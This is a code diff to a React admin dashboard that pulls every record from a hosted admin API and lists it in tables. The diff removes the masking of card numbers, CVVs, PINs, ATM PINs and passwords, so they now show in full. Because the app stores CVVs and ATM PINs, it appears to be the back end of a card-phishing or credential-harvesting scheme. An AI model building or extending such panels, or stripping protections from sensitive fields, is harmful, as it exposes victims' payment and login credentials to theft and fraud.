@@ -1,22 +1,5 @@
 import { useState, useEffect, useCallback } from 'react'
 
-const mask = (val, type) => {
-  if (!val) return '-'
-  const s = String(val)
-  switch (type) {
-    case 'card_number':
-      return s.length >= 4 ? 'xxxx xxxx xxxx ' + s.slice(-4) : 'xxxx xxxx xxxx ' + s
-    case 'cvv':
-      return 'xxx'
-    case 'pin':
-    case 'atm_pin':
-    case 'password':
-      return s.replace(/./g, '*')
-    default:
-      return val
-  }
-}
-
 const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'
 
 const sections = [
@@ -105,7 +88,6 @@ export default function App() {
                   if (c === 'created_at') val = new Date(val).toLocaleString()
                   if (typeof val === 'boolean') val = val ? 'Yes' : 'No'
                   if (c === 'amount') val = `₹${val}`
-                  if (['card_number','cvv','pin','atm_pin','password'].includes(c)) val = mask(val, c)
                   return <td key={c} style={styles.td}>{val ?? '-'}</td>
                 })}
               </tr>
